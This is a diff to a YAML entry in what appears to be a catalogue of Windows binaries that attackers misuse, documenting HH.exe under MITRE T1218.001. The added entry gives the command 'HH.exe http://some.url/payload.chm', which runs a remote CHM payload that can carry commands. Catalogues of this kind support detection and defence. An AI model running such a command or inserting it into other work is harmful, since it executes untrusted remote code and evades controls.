@@ -18,6 +18,20 @@ Commands:
     Privileges: User
     MitreID: T1218.001
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
+      - Input: Custom Format
+  - Command: HH.exe http://some.url/payload.chm
+    Description: Executes a remote payload.chm file which can contain commands.
+    Usecase: Execute commands with HH.exe
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.001
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: CHM
+      - Input: Custom Format
 Full_Path:
   - Path: C:\Windows\hh.exe
   - Path: C:\Windows\SysWOW64\hh.exe
